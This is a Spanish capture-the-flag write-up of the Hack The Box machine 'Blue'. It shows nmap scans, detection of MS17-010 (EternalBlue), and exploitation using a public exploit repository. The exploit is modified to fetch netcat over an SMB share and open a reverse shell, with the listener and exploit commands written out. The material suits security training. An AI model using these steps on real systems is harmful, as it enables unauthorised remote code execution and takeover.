

![1](</Writeups/Maquinas/Blue/img/logo.png>)
By Rug4lo

## Reconocimiento 

Primero vamos a hacer el reconocimiento de esta maquina con Nmap
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.40
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-06 18:58 CEST
Initiating SYN Stealth Scan at 18:58
Scanning 10.10.10.40 [65535 ports]
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Completed SYN Stealth Scan at 18:58, 18.24s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.11s latency).
Scanned at 2023-10-06 18:58:13 CEST for 18s
Not shown: 64405 closed tcp ports (reset), 1121 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds
           Raw packets sent: 89681 (3.946MB) | Rcvd: 73592 (2.944MB)
```
Vemos varios puertos abiertos, ahora vamos a usar los scripts básicos de nmap para sacar mas información de estos puertos
```bash
nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN Targeted 
```
```bash
# Nmap 7.93 scan initiated Thu Oct  5 19:18:16 2023 as: nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 -oN Targeted 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m54s, deviation: 34m35s, median: 3s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-05T17:19:26
|_  start_date: 2023-10-05T01:05:10
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-05T18:19:27+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  5 19:19:29 2023 -- 1 IP address (1 host up) scanned in 72.49 seconds
```
Viendo que el windows es una version antigua podemos probar a ver si es vulnerable al Eternal Blue
```bash
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 --script smb-vuln-ms17-010
```
```bash
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
Ahora que hemos visto que es vulnerable podemos usar este repositorio de github para explotarlo

Repositorio --> https://github.com/worawit/MS17-010

Una vez descargado este repositorio vamos a usar el cheker.py para ver si es vulnerable

![1](</Writeups/Maquinas/Blue/img/1.png>)

Podemos ver que no nos detecta ninguna pipe, por lo cual no es vulnerable, pero si cambiamos un parámetro en el cheker.py para indicarle el usuario guest

![1](</Writeups/Maquinas/Blue/img/2.png>)

Veremos que si lo volvemos a usar nos detectara varias pipes 

![1](</Writeups/Maquinas/Blue/img/3.png>)

## Explotación del Eternal Blue

Si modificamos el zzz_exploit.py para que use el usuario "gest" 

![1](</Writeups/Maquinas/Blue/img/4.png>)

Y modificamos el codigo, para que nos ejecute el comando que nosotros queremos (uno que lo que hace es descargarse el netcat.exe que vamos a subir a nusatro servicio SMB y ejecutarlo para mandarnos una reverse shell)

![1](</Writeups/Maquinas/Blue/img/5.png>)

Antes de ejecutar el script, vamos a crearnos un servidor smb en el directorio donde tenemos el nc.exe
```bash
python3 smbserver.py smbFolder $(pwd) -smb2support
```
Finalmente nos ponemos en escucha por el puerto 4444
```bash
nc -nlvp 4444
```
Ahora ejecutamos el script zzz_exploit.py
```bash
python2 zzz_exploit.py 10.10.10.40 samr
```
El comando se ejecutara:

![1](</Writeups/Maquinas/Blue/img/6.png>)

Y nosotros ganaremos acceso como Administrador 

![1](</Writeups/Maquinas/Blue/img/7.png>)